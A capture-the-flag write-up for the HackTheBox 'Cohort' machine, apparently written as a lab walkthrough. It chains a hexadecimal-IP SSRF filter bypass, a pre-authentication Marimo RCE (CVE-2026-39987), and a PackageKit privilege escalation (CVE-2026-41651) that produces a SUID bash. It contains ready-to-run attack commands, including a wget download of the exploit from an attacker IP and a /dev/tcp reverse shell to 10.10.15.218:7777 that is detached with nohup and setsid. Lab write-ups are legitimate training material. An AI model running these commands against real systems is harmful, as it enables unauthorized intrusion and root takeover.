# HackTheBox Cohort Full Chain Penetration Testing

## External Reconnaissance and Service Identification

- Full port scan revealed only `22`, `80` and `443`
- Web application hosted on `cohort.htb`
- `/api/validate` identified as SSRF entry point

## SSRF Exploitation

- Direct request to localhost was blocked by loopback address filtering
- Hexadecimal IPv4 representation was used to bypass the filter
```bash
curl -ks https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0x7F000001:80","format":"csv"}'
```

## Internal Service Enumeration via SSRF

- Port `5000` was identified as `cohort-insights`
```bash
curl -ks https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0x7F000001:5000/health","format":"json"}'
```
- API returned:
```json
{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"ok\": true, \"service\": \"cohort-insights\"}", "message": "Source reachable."}
```
- Several API endpoints returned `405 Method Not Allowed`, confirming that the routes existed but required a different HTTP method
## Hidden Vhost Discovery

- `/status` on the main nginx service exposed internal upstream configuration
```bash
curl -ks https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0x7F000001/status","format":"json"}'
```

- Response revealed:
```text
notebooks
host: nb-1be3782a8afd3ad5.cohort.htb
target: 127.0.0.1:8888
```
- Vhost redirected to `/auth/login`
- Login page contained `Access Token / Password`

## Marimo Version Identification

- Marimo version was retrieved through SSRF
```bash
curl -ks https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0x7F000001:8888/api/version","format":"json"}'
```
- API returned:
```text
0.20.4
```

## `CVE-2026-39987` — Marimo Pre-Authentication RCE
- Marimo `0.20.4` was vulnerable to unauthenticated command execution through `/terminal/ws`
- Exploit was used to obtain RCE as `marimo`
```bash
python3 exploit.py \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  "id"
```

- Successful RCE:
```text
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo@cohort:~$
```

## SSH Persistence
`marimo` shell was checked:
```text
marimo:x:1000:1000::/home/marimo:/usr/sbin/nologin
```
- `nologin` prevented interactive SSH session, Marimo RCE was used instead

## Local Privilege Escalation Enumeration
- PackageKit version was checked

```bash
dpkg-query -W packagekit packagekit-tools
```
- Returned: `packagekit -> 1.2.8-2ubuntu1.2`, `packagekit-tool -> 1.2.8-2ubuntu1.2`
- Additional version check: `pkcon --version -> 1.2.8`

## `CVE-2026-41651` — PackageKit Local Privilege Escalation

- PackageKit `1.2.8-2ubuntu1.2` was vulnerable to `CVE-2026-41651`
- Vulnerability allows unprivileged local user to install arbitrary packages as root
- `TOCTOU`race condition in PackageKit transaction handling

## PackageKit Exploitation on Cohort

- Compiled PoC was transferred to the target

```bash
wget -qO /tmp/cve-2026-41651 \
  http://10.10.15.218:8000/cve-2026-41651

chmod +x /tmp/cve-2026-41651
```

- Exploit was executed:

```bash
/tmp/cve-2026-41651
```

- Successful exploitation created: `/tmp/.suid_bash`
## SUID Bash Privilege Escalation

- Generated binary was a SUID copy of Bash

```bash
/tmp/.suid_bash -p -c 'id'
```

- Result:

```text
uid=1000(marimo) gid=1000(marimo) euid=0(root)
```
- `euid=0(root)` confirmed successful privilege escalation

## Reverse Shell Stabilization

- Initial reverse shell attempts died after Marimo WebSocket session closed
- Shell was detached from the Marimo PTY using `nohup`, `setsid` and background execution

```bash
nc -lvnp 7777
```

```bash
nohup setsid /tmp/.suid_bash -p -c \
'bash -p -i >& /dev/tcp/10.10.15.218/7777 0>&1' \
</dev/null >/dev/null 2>&1 &
```

- `nohup` ignored `SIGHUP`
- `setsid` created new session independent from Marimo PTY
- `&` executed process in background
- Stable reverse shell was obtained

## Final Root Access
- `/tmp/.suid_bash -p -c 'exec /bin/bash -p -i'` resulted in a root shell
- Extracted `/root/root.txt` flag
